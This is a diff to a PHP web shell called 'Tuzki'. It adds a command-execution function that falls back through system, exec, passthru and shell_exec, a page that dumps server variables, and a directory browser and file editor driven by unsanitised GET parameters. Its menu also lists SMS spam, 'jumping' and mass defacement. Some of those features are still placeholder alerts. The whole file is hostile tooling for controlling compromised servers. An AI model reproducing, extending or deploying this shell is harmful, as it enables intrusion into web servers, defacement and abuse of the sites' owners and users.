@@ -95,6 +95,12 @@ if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
 body {
 	background:black;
 	color:lavender;
+	text-shadow: 2px 2px 4px #000000;
+	background: url(http://shing.mobile9.com/download/media/538/tuzkiyouse_wk2o9pqf.jpg) no-repeat center center fixed; 
+	-webkit-background-size: cover;
+	-moz-background-size: cover;
+	-o-background-size: cover;
+	background-size: cover;
 	}
 	@font-face {
 	font-family: 'Orbitron';
@@ -103,24 +109,22 @@ body {
 	src: local('Orbitron Bold'), local('Orbitron-Bold'), url(http://fonts.gstatic.com/s/orbitron/v9/yMJWMIlzdpvBhQQL_QIAUjh2qtA.woff2) format('woff2');
 	unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
 	}
-	li {display: inline;}
-	a{
-	color:lime;
-	text-decoration:none;
+	li {
+	display: inline;
+	text-shadow: 2px 2px 4px #000000;
+	font-size:17px;
 	}
-	a:hover {
-	color:red;
-	}
+	a {color:lime;}
+	a:hover {color:red;}
 	table, tr, td {
-	border:1px solid green;
+	border:1px
 	}
 	.table_home, .th_home, .td_home {
 	border: 1px solid green;
 	font-size: 15px;
 	}
 	#textarea {
-	background-color:black;
-	color:lime;
+	background: transparent;
 	width: 1066px;
 	height: 500px;
 	font-family: Arial, Helvetica, monospace;
@@ -130,6 +134,7 @@ body {
 	*{font-family: 'Orbitron';}
 	</style>
 	</head>
+	<body>
 <?php
 
 // FUNCTION
@@ -184,8 +189,16 @@ function jumping() {
 function config() {
 	alert("Kalem euy");
 }
-function massdeface() {
+function mass_deface() {
 	alert("Kalem euy");
+}
+function info() {
+	?>
+	<center>
+	<textarea class="form-control" id="textarea" readonly/><?php print_r($_SERVER);?></textarea>
+	</center>
+	<?php
+	die();
 }
 function logout() {
 	unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
@@ -213,19 +226,41 @@ $text=file_get_contents($filename);
 <?php
 die();
 }
-function open() {
-	alert("Kalem euy");
-	home();
+function cmd($cmd) {
+	if(function_exists('system')) {
+		ob_start();
+		@system($cmd);
+		$buff=ob_get_contents();
+		ob_end_clean();
+		return $buff;
+	} elseif(function_exists('exec')) {
+		@exec($cmd,$results);
+		$buff = "";
+		foreach($results as $result) {
+			$buff .= $result;
+		} return $buff;
+	} elseif(function_exists('passthru')) {
+		ob_start();
+		@passthru($cmd);
+		$buff=ob_get_contents();
+		ob_end_clean();
+		return $buff;
+	} elseif(function_exists('shell_exec')) {
+		$buff = @shell_exec($cmd);
+		return $buff;
+	} 
 }
 // ENDFUNCTION
 ?>
 <center>
 	<div id='menu'>
+		<h1>Tuzki</h1>
 		<li><a href='?do=home'>[ Home ]</a></li>
 		<li><a href='?do=sms'>[ Spam SMS ]</a></li>
 		<li><a href='?do=jumping'>[ Jumping ]</a></li>
 		<li><a href='?do=config'>[ Config ]</a></li>
-		<li><a href='?do=massdeface'>[ Mass Deface ]</a></li>
+		<li><a href='?do=mass_deface'>[ Mass Deface ]</a></li>
+		<li><a href='?do=info'>[ Server Info ]</a></li>
 		<li><a href='?do=logout'>[ Logout ]</a></li>
 	</div>
 </center>
@@ -238,25 +273,32 @@ if($_GET['do'] == 'home') {
 	jumping();
 } elseif($_GET['do'] == 'config') {
 	config();
+} elseif($_GET['do'] == 'mass_deface') {
+	mass_deface();
+} elseif($_GET['do'] =='info') {
+	info();
 } elseif($_GET['do'] == 'logout') {
 	logout();
 } elseif($_GET['do'] == 'edit' AND isset($_GET['files'])) {
 	edit($_GET['files']);
 } elseif($_GET['do'] == 'open' AND isset($_GET['dir'])) {
-	open($_GET['dir']);
+	$dir = $_GET['dir'];
+	chdir($dir);
 }
-$dir=scandir(getcwd());
+$dir = scandir(getcwd());
 foreach($dir as $dir):
 ?>
 <table width='70%' class='table_home' cellpadding='3' cellspacing='3' align='center'>
 	<tr>
 		<?php if(is_dir($dir)) {
-		echo "<td><a href='?do=open&dir=$dir'>$dir</a></td>";
+		echo "<td><a href='?do=open&dir=".getcwd().substr('\\',0,1).$dir."'>$dir</a></td>";
 	} else {
-		echo "<td><a href='?do=edit&files=$dir'>$dir</a></td>";
+		echo "<td><a href='?do=edit&files=".getcwd().substr('\\',0,1).$dir."'>$dir</a></td>";
 	}
 	?>
 	</tr>
 </table>
 <?php
 endforeach;
+?>
+</body>
